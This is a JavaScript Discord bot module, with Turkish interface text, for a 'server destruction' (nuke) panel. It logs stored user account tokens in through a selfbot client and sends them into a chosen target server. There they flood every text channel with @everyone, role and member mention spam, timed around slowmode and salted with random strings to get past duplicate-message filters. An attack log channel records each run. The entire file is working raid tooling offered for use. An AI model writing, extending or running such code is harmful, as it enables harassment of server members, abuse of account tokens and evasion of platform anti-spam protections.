const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, PermissionFlagsBits } = require('discord.js');
const mongoose = require('mongoose');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');

const Account = mongoose.models.Account || mongoose.model('Account', new mongoose.Schema({ userId: String, token: String, username: String }));
const LOG_CHANNEL_ID = "1537938887509278871"; 

if (!global.activeNukes) global.activeNukes = new Map();
const tempNukeSession = new Map();

async function renderPatlatPanel(userId) {
    const userAccounts = await Account.find({ userId: userId });
    
    // O an patlatma işlemi yapan hesapları say
    let aktifSayisi = 0;
    userAccounts.forEach(acc => {
        if (global.activeNukes.has(acc.token)) aktifSayisi++;
    });

    const embed = new EmbedBuilder()
        .setTitle('<a:emoji58:1537925046486433802> Void | Gelişmiş Sunucu İmha Paneli <a:emoji24:1537925080447717447>')
        .setColor('#2b2d31')
        .setDescription(
            '<a:emoji109:1537925984882266212> **Zeki Nuke Algoritması**\n' +
            'Hesaplarınız hedef sunucuya girer, yavaş modu hesaplar, Everyone izni yoksa rolleri, o da yoksa üyeleri etiketleyerek sunucuyu felç eder.\n\n' +
            `<a:emoji110:1537925433763299418> Kayıtlı Hesap Sayısı: **${userAccounts.length}**\n` +
            `<a:emoji110:1537925433763299418> Aktif Operasyondaki Hesaplar: **${aktifSayisi}**\n\n` +
            '<a:emoji24:1537925080447717447> *Saldırıyı başlatmak veya durdurmak için butonları kullanın.*'
        );

    const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('tk_patlat_hepsi').setLabel('🔥 Tüm Hesaplarla Patlat').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('tk_patlat_sec').setLabel('🔥 Seçili Hesapla Patlat').setStyle(ButtonStyle.Secondary)
    );
    
    const row2 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('tk_patlat_durdur').setLabel('🛑 Tüm Saldırıları Durdur').setStyle(ButtonStyle.Success)
    );

    return { embeds: [embed], components: [row1, row2] };
}

module.exports = {
    name: 'patlat', 
    data: new SlashCommandBuilder().setName('patlat').setDescription('Gelişmiş Nuke Paneli'),

    async executeText(message) {
        const infoEmbed = new EmbedBuilder()
            .setTitle('<a:emoji58:1537925046486433802> Void | Sunucu İmha Sistemi <a:emoji24:1537925080447717447>')
            .setDescription('<a:emoji109:1537925984882266212> **Uyarı:** Bu sistem sunucuları geri dönülemez şekilde felç eder.\n\n<a:emoji24:1537925080447717447> *Paneli açmak için tıklayın.*')
            .setColor('#2b2d31');
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('btn_patlat_panel').setLabel('İmha Panelini Aç').setStyle(ButtonStyle.Danger).setEmoji('💣'));
        await message.channel.send({ embeds: [infoEmbed], components: [row] });
    },

    async handleInteraction(i) {
        const id = i.customId;

        if (id === 'btn_patlat_panel') {
            await i.deferReply({ flags: 64 }).catch(()=>{});
            return i.editReply(await renderPatlatPanel(i.user.id));
        }

        // ================= BAŞLATMA SEÇENEKLERİ =================
        if (id === 'tk_patlat_hepsi' || id === 'tk_patlat_sec') {
            const userAccounts = await Account.find({ userId: i.user.id });
            if (userAccounts.length === 0) return i.reply({ content: '<a:emoji197:1537925769068806214> Kayıtlı tokeniniz yok!', flags: 64 });

            if (id === 'tk_patlat_sec') {
                const options = userAccounts.map((acc, index) => ({ label: acc.username || `Hesap ${index + 1}`, value: acc.token }));
                const selectMenu = new ActionRowBuilder().addComponents(new StringSelectMenuBuilder().setCustomId('select_patlat_token').setPlaceholder('Patlatma yapacak hesabı seçin').addOptions(options));
                return i.reply({ content: '<a:emoji109:1537925984882266212> Lütfen saldırıyı yapacak hesabı seçin:', components: [selectMenu], flags: 64 });
            }

            tempNukeSession.set(i.user.id, { tokens: userAccounts.map(a => a.token) });
            const modal = new ModalBuilder().setCustomId('modal_patlat_baslat').setTitle('🔥 Hedef Sunucu Ayarları');
            modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('g_id').setLabel('Hedef Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)));
            await i.showModal(modal);
        }

        if (id === 'select_patlat_token') {
            tempNukeSession.set(i.user.id, { tokens: [i.values[0]] }); 
            const modal = new ModalBuilder().setCustomId('modal_patlat_baslat').setTitle('🔥 Hedef Sunucu Ayarları');
            modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('g_id').setLabel('Hedef Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)));
            await i.showModal(modal);
        }

        // ================= SALDIRI (NUKE) ALGORİTMASI =================
        if (id === 'modal_patlat_baslat') {
            await i.deferUpdate().catch(()=>{});
            const hedefSunucuId = i.fields.getTextInputValue('g_id');
            const sessionData = tempNukeSession.get(i.user.id);
            if (!sessionData) return;

            let baslatilan = 0;

            for (const token of sessionData.tokens) {
                if (global.activeNukes.has(token)) continue; 
                
                try {
                    const selfBot = new SelfbotClient({ checkUpdate: false });
                    
                    selfBot.on('ready', async () => {
                        const guild = selfBot.guilds.cache.get(hedefSunucuId);
                        if (!guild) {
                            selfBot.destroy();
                            return;
                        }

                        // DOĞRU LOG SİSTEMİ (Gerçek Sunucu Adı ve ID'si ile)
                        const logChannel = i.client.channels.cache.get(LOG_CHANNEL_ID);
                        if (logChannel) {
                            const logEmbed = new EmbedBuilder()
                                .setTitle('<a:emoji58:1537925046486433802> Void | Sunucu İmha Başladı! 💣')
                                .setColor('#2b2d31')
                                .setDescription(
                                    `<a:emoji109:1537925984882266212> **Saldırıyı Başlatan:** \`${i.user.tag}\`\n` +
                                    `<a:emoji110:1537925433763299418> **Hedef Sunucu:** \`${guild.name}\` (\`${guild.id}\`)\n` +
                                    `<a:emoji24:1537925080447717447> **Kullanılan Hesap:** \`${selfBot.user.tag}\`\n\n` +
                                    `*Algoritma çalışıyor, yavaş modlar ve izinler hesaplandı.*`
                                )
                                .setThumbnail(guild.iconURL({ dynamic: true }) || i.user.displayAvatarURL({ dynamic: true }))
                                .setTimestamp();
                            logChannel.send({ embeds: [logEmbed] }).catch(()=>{});
                        }

                        // Verileri Çek
                        let members = [];
                        try { members = Array.from((await guild.members.fetch()).values()); } catch(e){}
                        const roles = guild.roles.cache.filter(r => r.name !== "@everyone");
                        const channels = guild.channels.cache.filter(c => c.isText());
                        
                        let nukeIntervals = [];

                        // TÜM KANALLARA AYNI ANDA DAL
                        channels.forEach(channel => {
                            const perms = channel.permissionsFor(selfBot.user);
                            if (!perms || !perms.has('SEND_MESSAGES')) return;

                            const canEveryone = perms.has('MENTION_EVERYONE');
                            const slowmode = channel.rateLimitPerUser || 0;

                            let spamText = "";
                            
                            // 1. ZEKİ ETİKET SİSTEMİ
                            if (canEveryone) {
                                spamText = "@everyone @here <a:emoji58:1537925046486433802> **VOID GELDİ, SUNUCU PATLIYOR! KAÇIN!** <a:emoji24:1537925080447717447>";
                            } else {
                                let roleMentions = roles.map(r => `<@&${r.id}>`).join(" ");
                                if (roleMentions.length > 20) {
                                    spamText = roleMentions.substring(0, 1500) + "\n<a:emoji58:1537925046486433802> **VOID SİZİ BULDU!** 🔥";
                                } else {
                                    let userMentions = "";
                                    for(let k = 0; k < 18; k++) {
                                        if(members.length > 0) userMentions += `<@${members[Math.floor(Math.random()*members.length)].id}> `;
                                    }
                                    spamText = userMentions + "\n<a:emoji58:1537925046486433802> **VOID İÇİNİZDEN GEÇİYOR!** 🔥";
                                }
                            }

                            // 2. SPAM DÖNGÜSÜ (Anti-Bypass Korumalı)
                            const blast = () => {
                                const bypass = Math.random().toString(36).substring(2,6); // Aynı mesaj engeline takılmamak için
                                channel.send(spamText + " | " + bypass).catch(()=>{});
                            };

                            // 3. YAVAŞ MOD HESAPLAYICI (Slowmode)
                            const delay = slowmode > 0 ? (slowmode * 1000) + 200 : 800; 
                            
                            // İlk mesajı anında at, sonrakileri döngüye sok
                            blast();
                            const interval = setInterval(blast, delay);
                            nukeIntervals.push(interval);
                        });

                        global.activeNukes.set(token, { client: selfBot, intervals: nukeIntervals });
                    });
                    
                    await selfBot.login(token);
                    baslatilan++;
                } catch (e) {}
            }
            
            await i.editReply(await renderPatlatPanel(i.user.id));
            await i.followUp({ content: `<a:emoji110:1537925433763299418> Hedefe **${baslatilan}** hesapla saldırı başlatıldı! Logları kontrol edin.`, flags: 64 });
        }

        // ================= SALDIRIYI DURDUR =================
        if (id === 'tk_patlat_durdur') {
            await i.deferUpdate().catch(()=>{});
            const userAccounts = await Account.find({ userId: i.user.id });
            let durdurulan = 0;

            for (const acc of userAccounts) {
                if (global.activeNukes.has(acc.token)) {
                    const nukeData = global.activeNukes.get(acc.token);
                    
                    // Bütün kanal döngülerini (spamı) durdur
                    nukeData.intervals.forEach(int => clearInterval(int));
                    
                    // Hesapları oyundan çıkar
                    try { nukeData.client.destroy(); } catch(e){}
                    
                    global.activeNukes.delete(acc.token);
                    durdurulan++;
                }
            }

            await i.editReply(await renderPatlatPanel(i.user.id));
            if (durdurulan > 0) {
                await i.followUp({ content: `<a:emoji110:1537925433763299418> **${durdurulan}** hesabın saldırısı başarıyla durduruldu!`, flags: 64 });
            } else {
                await i.followUp({ content: `<a:emoji197:1537925769068806214> Şu an aktif bir saldırınız bulunmuyor.`, flags: 64 });
            }
        }
    }
};